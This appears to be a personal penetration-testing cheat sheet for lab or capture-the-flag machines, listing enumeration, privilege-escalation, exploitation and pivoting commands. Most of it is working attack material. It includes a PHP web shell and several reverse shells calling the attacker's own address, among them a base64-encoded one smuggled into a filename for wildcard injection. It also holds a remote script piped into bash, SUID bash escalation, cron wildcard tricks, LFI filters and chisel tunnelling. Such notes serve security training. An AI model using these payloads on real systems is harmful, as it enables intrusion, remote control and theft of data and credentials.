# Enumeration


## Tools

See all the commands run, cronjobs also 
https://github.com/DominicBreuker/pspy

## Enum

Getting all the ports
```bash
nmap --min-rate 5000 -p- -T5 -n -vvv 10.10.10.79 -oN ports 
```
Script and Version scan
```bash
nmap -sC -sV -p22,80,443 10.10.10.79 -oN scan
```
Vuln scan
```bash
nmap --script vuln -oN vulns 10.10.10.79
```

If there's a CGI available for us, we can review if the CGI is vulerable to shell shock attack, also we need to enumerate `.sh` `.perl` and `cgi` files in dirbusters.

## Partition

```bash
df -h
mkdir /mnt/emanlui
mount /dev/sda2 /mnt/emanlui/
cd /mnt/emanlui/
```

## Manual enumeration scripts

Host discovery

```bash
#!/bin/bash

hosts=("172.19.0" "172.18.0")

for host in ${hosts[@]}; do
        echo -e "$host.0/24\n"
	for i in $(seq 1 254); do
		timeout 1 bash -c "ping -c 1 $host.$i" &> /dev/null && echo "HOST $host.$i - ACTIVE" &
	done; wait
done
```

Port discovery

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n Exit"
	exit 1
}
# Ctrl + C
trap ctrl_c INT

hosts=("172.19.0.3" "172.19.0.2" "172.19.0.1" "172.18.0.1")

tput civis
for host in ${hosts[@]}; do
	echo -e "Scanning $host \n"
	for port in $(seq 1 10000); do
		timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2> /dev/null && echo -e "Port $port OPEN" &
	done; wait
done
tput cnorm
```

## Linux Enumeration

```bash
find \-perm -4000 2>/dev/null
cat /etc/crontab
ls /var/spool/cron/crontabs
ls /etc/cron.d
```

## Dirbuster

Always run the following extensions:

- bak
- txt
- html
- htm
- php
- sh
    
## SMB

```bash
smbmap -H IP --depth 5 -d DOMAIN
```

## DNS

Zone Transfer


```bash
dig axfr @server url
```

## Redis Enum

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

# Linux

## Linpeas
```bash
python3 -m http.server
curl [ip]:8000/linpeas.sh | bash
```

## Priv escalation

```bash
sudo -l
```

Always look for config files and credentials

To find process running as root.
```bash
ps -aux | grep root
```

Cracking password
```sh
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout encrypted_pass > password.txt
hashcat -m 3200 file_with_the_hash_password password.txt
```

Review if this file has something interesting `/etc/autologin`

Changing SUID permisions and running bash
```sh
chmod u+s /bin/bash
/bin/bash -p
```

`Always take a look when a file is running as root but there's no absolute path, we can trick the system to run our code instead.`

Some scripts can even run a command to access X resource and then delete it, we can do a race condition in this case for the script to get our file to run 

```sh
while true ; do echo 'ssh-rsa AAAAB3NzaC1yc... kali@kali' | tee /tmp/ssh-*; done
```

Verify if there's any cronjob running

If a cronjob is executing binaries that you can access, then this is an open port for a priv escalation.
Also, we need to verify if there's any wildcards on the file, this is very dangerous because the wildcard can be anything. `/bin/bash -p` for example. 

```bash
echo 'chmod u+s /bin/bash' > test.rdb
touch -- '-e sh test.rdb'
watch -n 1 ls -l /bin/bash
bash -p
```

Always look for lxd user, we can always get root with that user.

# Tips

Always check where are all the important files of any service, we can google that though...

When you can't access the page, maybe is the DNS
```bash
sudo echo "IP domain.subdomain.htb" >> /etc/hosts 
sudo echo "IP subdomain.htb" >> /etc/hosts 
```

`Always check for default creds.`

`Always check if there's a SUID binary that YOU can access and change`

`Always check the Apache logs, this can be found at /var/log`

`If you got creds TRY every possible login.`

# Exploitation
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```
or
```bash
script /dev/null -c bash
```
```bash
CTRL Z
stty raw -echo;fg
reset
```
```bash
export TERM=xterm 
```
or
```bash
export TERM=screen
```
```bash
export SHELL=bash
```

## Configure stty
```bash
stty -a  
stty rows 45 columns 177
```


## Sending data

Our machine
```bash
nc -nlvp 1236 < chisel 
```

Victim
```bash
cat > chisel < /dev/tcp/10.10.14.3/1236
```

## PHP

### PHP file execution

```php
<?php 
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

### PHP LFI

Getting base64 of local files
```bash
php://filter/convert.base64-encode/resource=login
```

Always check for `/var/log/httpd.log`

When doing LFI, try to always use the source code, sometimes the output will not be shown to us, but it can be in the source code.

## SOCAT

```bash
./socat TCP-LISTEN:8000,fork tcp:10.10.14.17:5000 &
./socat TCP-LISTEN:4446 STDOUT
```

## PHP File upload

Sometimes the magic bytes are needed to upload and run a file. Check if the php file has ALL the code in the system, the magic bytes
can delete some code and ruin the reverse shell. Also the file might need the `reverse_shell.php.jpg`  extensions

## Root input

Whenever there's an input on a bash script, we can append and ` bash` and in most cases it will execute the command

https://seclists.org/fulldisclosure/2019/Apr/24

# Priv escalation


Remember to check if there are any bad characters or if the box has all the things needed for the reverse shell, for example: `sh, bash, python, python3, etc`
## Creating files with special characters.

```bash
echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.31/4445 0>&1"' | base64 
touch -- 'echo -n "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS80NDQ1IDA+JjEi" | base64 -d | bash'
```

This will create a file call

```bash
echo -n "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS80NDQ1IDA+JjEi" | base64 -d | bash
```

## Execute code with no absolute path

```bash

cd /tmp
export PATH=/tmp;$PATH
echo $PATH
```
Now create the binary that the code was executing with no absolute path
chmod +x ourbinary

And when we execute the code, we should get the bash

## Python imports

Always check when there's a library that we can access

## Reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.31 4444 >/tmp/f

bash -c 'bash -i >& /dev/tcp/10.10.14.31/4444 0>&1'
```


## Forensics

Always use strings on everything, even partitions to recover data (sda, sdb, etc)...

### Jar files

We can use jd-gui to open up `.jar` files


### Tools

- dcfldd
- binwalk to extract data
- testdisk
- photorec


## Crack ssh keys

```bash
python ssh2john.py Matt > crack.ssh 
john --wordlist=/usr/share/wordlists/rockyou.txt crack.ssh
```

## Directories

A directory can be hidden to us, but the inside doesn't.

/home/emanlui/    is not accessible by us, but
/home/emanlui/.ssh/id_rsa   can, we need to check all the possible folder that we can really access to.

## Ports

Always look for port to port forward.

### Chisel 

Our machine
```bash
./chisel server --reverse -p 1236
```
Victim
```bash
		connecting to server       my machine   victim machine
./chisel client 10.10.14.3:1236          R:127.0.0.1:80:172.19.0.3:80     R:127.0.0.1:6379:172.19.0.2:6379
```

### SSH

If you have an active session os ssh, you can use it to port forward anything

```bash
Enter + ~ + C to enter into SSH mode
ssh> -L 52846:127.0.0.1:52846
```
